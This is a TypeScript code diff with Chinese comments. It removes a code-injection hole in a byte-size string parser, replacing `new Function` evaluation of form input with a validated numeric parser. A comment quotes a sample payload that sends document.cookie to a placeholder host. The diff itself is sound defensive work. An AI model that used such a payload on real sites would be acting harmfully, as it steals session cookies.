@@ -1,4 +1,35 @@
 /**
+ * 数值部分的单个因子：十进制或科学记数法，允许带符号。
+ * 例：`1024`、`5.4`、`.5`、`1e3`、`-2`
+ */
+const NUMERIC_FACTOR = /^[+-]?(?:\d+(?:\.\d+)?|\.\d+)(?:e[+-]?\d+)?$/;
+
+/**
+ * 解析数值部分：一个或多个因子相乘，例如 `1024`、`1e3`、`128*1024`。
+ * 无法解析时返回 null。
+ *
+ * 这里以前是 `new Function(\`return ${numericPart}\`)()`，而 numericPart 直接来自
+ * 节点编辑对话框的表单字段（粘贴的内容也算）—— 也就是说面板里权限最高的页面之一上
+ * 有一个任意 JS 执行点，`1;(fetch('//x/?c='+document.cookie))` 会照常执行。
+ * 现在只接受乘号分隔的数字因子；不是数字就返回 null，任何东西都不会被求值。
+ */
+function evaluateNumericPart(numericPart: string): number | null {
+  const factors = numericPart.split("*");
+  let value = 1;
+  for (const factor of factors) {
+    if (!NUMERIC_FACTOR.test(factor)) {
+      return null;
+    }
+    const parsed = Number(factor);
+    if (!Number.isFinite(parsed)) {
+      return null;
+    }
+    value *= parsed;
+  }
+  return value;
+}
+
+/**
  * 将表示数据大小的字符串（如 '1.5MB', '128*1024gb'）转换为字节数。
  * @param str - 输入的字符串。
  * @returns - 计算出的字节数（number）。如果无法解析，则返回 0。
@@ -6,7 +37,7 @@
  * stringToBytes('1MB');        // 1048576
  * stringToBytes('1 MB');        // 1048576
  * stringToBytes('5.4MB');      // 5662310.4
- * stringToBytes('6,222,765 MB'); // 6525139624935
+ * stringToBytes('6,222,765 MB'); // 6525042032640
  * stringToBytes('128*1024gb'); // 140737488355328
  * stringToBytes('1e3kb');       // 1024000 (1000 * 1024)
  * stringToBytes('0.2gb');       // 214748364.8
@@ -67,24 +98,12 @@ export function stringToBytes(str: string): number {
     numericPart = "1";
   }
 
-  try {
-    // 3. 计算数值部分
-    // 使用 Function 构造函数来安全地评估可能包含乘法或科学记数法的表达式
-    // 注意：这仍然假设输入源是可信的，因为它能执行简单的数学运算
-    const value = new Function(`return ${numericPart}`)();
-
-    if (isNaN(value)) {
-      return 0;
-    }
-
-    // 4. 乘以单位对应的倍数
-    const multiplier = units[unit];
-    return Math.round(value * multiplier);
-  } catch (error) {
-    // 如果表达式无效（例如 "abc-gb"），则捕获错误并返回 0
-    console.error(`Error parsing string "${str}":`, error);
+  // 3. 计算数值部分，再乘以单位对应的倍数
+  const value = evaluateNumericPart(numericPart);
+  if (value === null || Number.isNaN(value)) {
     return 0;
   }
+  return Math.round(value * units[unit]);
 }
 
 export function formatBytes(bytes: number | null | undefined): string {
